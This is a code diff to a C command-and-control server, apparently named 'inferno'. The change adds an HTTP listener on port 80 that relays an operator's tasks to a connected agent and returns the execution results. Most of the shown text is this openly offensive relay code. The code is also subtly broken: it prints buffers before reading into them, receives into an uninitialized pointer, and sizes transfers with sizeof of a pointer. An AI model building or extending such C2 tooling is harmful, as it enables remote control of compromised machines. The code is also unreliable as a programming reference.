@@ -7,9 +7,9 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-
 #define IP "127.0.0.1"
-#define PORT 8000
+#define PORT_TCP 33333
+#define PORT_HTTP 80
 
 //handle erros
 void error(char *message) {
@@ -17,75 +17,104 @@ void error(char *message) {
     exit(EXIT_FAILURE);
 }
 
-//void write();
+//starting the HTTP listener
+int http_listener(int http_listener_socket);
+
+//transfering over HTTP payload and receiving payload results
+char *http_transfer(int http_listener_accept, char *task);
 
 int main() {
+    int session = 0;
 
-    //socket
+    //socket tcp
     printf("Initializing socket...\n");
     int inferno_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (inferno_socket == -1)
         error("Socket creation failed");
 
+    //preparing address tcp
     struct sockaddr_in c2_address;
     memset(&c2_address, 0, sizeof(c2_address));
     c2_address.sin_family = AF_INET;
-    c2_address.sin_port = htons(PORT);
+    c2_address.sin_port = htons(PORT_TCP);
     c2_address.sin_addr.s_addr = inet_addr(IP);
+    
+    //http socket
+    int http_listener_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
-
-    //bind
+    //bind tcp
     printf("Binding socket to c2 address...\n");
     int inferno_bind = bind(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
     if (inferno_bind == -1) 
         error("Binding socket failed");
 
-    //listen
-    printf("Listening to %s:%d\n", IP, PORT);
+    //listen tcp
+    printf("Listening to %s:%d\n", IP, PORT_TCP);
     int inferno_listen = listen(inferno_socket, 0);
     if (inferno_listen == -1) 
         error("Listening failed");
 
     while (1) {
-        //accept
+        //accept tcp
         printf("Accepting...\n");
         int inferno_accept = accept(inferno_socket, NULL, NULL);
         if (inferno_accept == -1)
             error("Accepting failed");
         
-        //accept agent
-        printf("Accepting agent...\n");
-        int inferno_accept_agent = accept(inferno_socket, NULL, NULL);
-
         while (1) {
             //receive from client
             char input[1024];
-            printf("Receiving...\n");
+            printf("Received from client: %s\n", input);
             int inferno_receive = recv(inferno_accept, input, sizeof(input), 0);
             if (inferno_receive == 0) {
-                 printf("Socket closed by peer\n");
+                 puts("Socket closed by peer");
                  break;
             }
 
-            printf("Received: %d bytes\n", strlen(input));
-            printf("Received: %s\n", input);
-            
-            //sending to agent
-            printf("Sending: %d bytes\n", strlen(input));
-            ssize_t inferno_send = send(inferno_accept_agent, input, sizeof(input), 0);
-            printf("Sent: %s to agent\n", input);
+            char *status;
+            int http_listener_accept;
+            char *executed;
 
-            //receive from agent
-            char fromagent[1024];
-            printf("Receiving...\n");
-            int inferno_receive_from_agent = recv(inferno_accept_agent, fromagent, sizeof(fromagent), 0);
-            printf("Received\n");
+            //check if client session established
+            if (strcmp(input, "ok") == 0) {
+                puts("Session started");
+                puts("==========START SESSION==========");
+                session = 1;
+            }
 
-            //send to client
-            printf("Sending: %s to client\n", fromagent);
-            send(inferno_accept, fromagent, sizeof(fromagent), 0);
-            printf("Sent\n");
+            //check if operator want start HTTP listener
+            if (strcmp(input, "http") == 0) {
+                //preparing listener
+                puts("Preparing HTTP listener");
+                http_listener_accept = http_listener(http_listener_socket);
+                
+                //agent is connected to server
+                puts("Agent connected");
+                status = "ok";
+                strcpy(input, status);
+            }
 
+            //handle all client/agent communications
+            while (session) {
+                char inside[1024];
+                puts("==========START PAYLOAD==========");
+
+                //receive from client
+                recv(inferno_accept, inside, sizeof(inside), 0);
+                printf("Receiving from client:\n%s\n", inside);
+                
+                //transfering (receiving/sending to agent)
+                executed = http_transfer(http_listener_accept, inside);
+                
+                //sending to client
+                send(inferno_accept, executed, sizeof(executed), 0);
+                printf("Sending to client: %s\n", executed);
+                puts("===========END PAYLOAD===========\n");
+            }
+
+            //sending to client
+            printf("Sending to client: %s\n", input);
+            send(inferno_accept, input, sizeof(input), 0);
         }
 
         //close accept
@@ -99,42 +128,44 @@ int main() {
             error("Failed closing socket");
 }
 
-/*
-void write() {
+int http_listener(int http_listener_socket) {
 
-        const char response_ok[] = "HTTP/1.0 200 OK\r\n\r\n";
-        char request[1024];
-        char request_copy[1024];
-        
-        printf("Content: %s\n", content);
+    //socket http
+    printf("Initializing http listener...\n");
 
-        char readed[1024];
-        //read
-        printf("Reading content...\n");
-        inferno_read = read(inferno_open, readed, sizeof(readed));
-        if (inferno_read == -1)
-            error("Failed reading content");
-        readed[inferno_read] = '\0';
-        printf("Content: %s\n", readed);
+    //preparing http address
+    struct sockaddr_in http_listener_address;
+    memset(&http_listener_address, 0, sizeof(http_listener_address));
+    http_listener_address.sin_family = AF_INET;
+    http_listener_address.sin_port = htons(PORT_HTTP);
+    http_listener_address.sin_addr.s_addr = inet_addr(IP);
+    printf("HTTP listener initialized\n");
+    
+    //bind http
+    printf("Binding http listener...\n");
+    int http_listener_bind = bind(http_listener_socket, (struct sockaddr *) &http_listener_address, sizeof(http_listener_address));
 
-        //close stream
-        if (close(inferno_open) == -1)
-            error("Failed closing stream");
+    //listen http
+    printf("Listening...\n");
+    int http_listener_listen = listen(http_listener_socket, 0);
 
-        //write status
-        printf("Sending response...\n");
-        ssize_t inferno_write = write(inferno_accept, response_ok, sizeof(>
-        if (inferno_write == -1)
-            error("Failed sending response");
-
-        //write file
-        printf("Sending content of: %s\n", content);
-        inferno_write = write(inferno_accept, readed, sizeof(readed));
-        if (inferno_write == -1)
-            error("Failed sending content");
-
-        //close
-        if (close(inferno_accept) == -1)
-            error("Failed closing accept");
+    //accept http
+    printf("Accepting...\n");
+    int http_listener_accept = accept(http_listener_socket, NULL, NULL);
+    
+    return http_listener_accept;
 }
-*/
+
+char *http_transfer(int http_listener_accept, char *task) {
+     //sending task to client
+     send(http_listener_accept, task, 1024, 0);
+     printf("Sending to agent:\n\n%s\n", task);
+
+     //receiving client execution
+     char *executed;
+     recv(http_listener_accept, executed, sizeof(executed), 0);
+     printf("Received from agent: %s\n", executed);
+
+     //return client execution
+     return executed;
+}
